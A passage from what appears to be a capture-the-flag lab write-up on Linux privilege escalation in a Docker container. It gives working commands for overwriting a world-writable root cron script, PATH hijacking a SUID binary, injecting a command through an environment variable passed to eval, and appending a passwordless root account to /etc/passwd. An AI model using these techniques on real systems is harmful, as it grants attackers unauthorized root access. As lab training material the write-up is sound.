echo 'Cleanup done' >> /var/log/maintenance.log
EOF
  chmod 777 /opt/maintenance.sh   # world-writable!
  echo '* * * * * root /opt/maintenance.sh' > /etc/cron.d/maintenance
  service cron start 2>/dev/null || cron &
"

# Exploit: overwrite world-writable cron script
python3 cron_abuse.py --container shell-lab
```

**Key technique:** Since `/opt/maintenance.sh` is world-writable and runs as root via cron, any user can overwrite it with a payload that copies the flag to a readable location.

---

## Challenge 2: SUID Shell Script Exploitation

### Objective

Find SUID-set custom binaries and exploit them via PATH hijacking to gain root privileges.

**Flag format**: `CTF{su1d_3xpl01t_sh3ll_3sc}`

### Solution

```bash
# Find SUID files
find / -perm -4000 -type f 2>/dev/null

# Analyze vuln_admin binary
strings /usr/local/bin/vuln_admin | grep -E "cat|ls|id|system"

# PATH hijacking
mkdir /tmp/hijack
echo '#!/bin/bash
cp /root/flag_suid.txt /tmp/suid_flag.txt
chmod 777 /tmp/suid_flag.txt
exec /bin/cat "$@"' > /tmp/hijack/cat
chmod +x /tmp/hijack/cat
export PATH=/tmp/hijack:$PATH
/usr/local/bin/vuln_admin

# Or use the script
python3 suid_exploit.py --container shell-lab
```

---

## Challenge 3: Environment Variable Injection

### Objective

Exploit a shell script that unsafely processes environment variables via `eval` to execute arbitrary commands and get the flag.

**Flag format**: `CTF{3nv_1nj3ct10n_r00t3d}`

### Solution

```bash
# Exploit eval injection
USERNAME='$(cat /root/flag_env.txt > /tmp/env_flag.txt)' \
  bash /usr/local/bin/process_user.sh

cat /tmp/env_flag.txt

# Using the script
python3 env_inject.py --container shell-lab \
  --script /usr/local/bin/process_user.sh
```

---

## Challenge 4: Comprehensive Bash Privilege Escalation

### Objective

Enumerate all privilege escalation vectors including `sudo -l`, writable `/etc/passwd`, and `LD_PRELOAD` to obtain root and retrieve the flag.

**Flag format**: `CTF{b4sh_pr1v3sc_4ll_v3ct0rs}`

### Solution

```bash
# Manual enumeration
sudo -l                                                    # check sudo rights
find / -writable -not -path "*/proc/*" 2>/dev/null        # writable files

# Exploit writable /etc/passwd
echo 'root2::0:0::/root:/bin/bash' >> /etc/passwd
su root2 -c "cat /root/flag_privesc.txt"

# Exploit sudo find (GTFOBins)
sudo find / -exec /bin/cat /root/flag_privesc.txt \; -quit

# Using the script
python3 bash_privesc.py --container shell-lab --setup
python3 bash_privesc.py --container shell-lab
```

---

## Cleanup

```bash
docker stop shell-lab 2>/dev/null && docker rm shell-lab 2>/dev/null
```
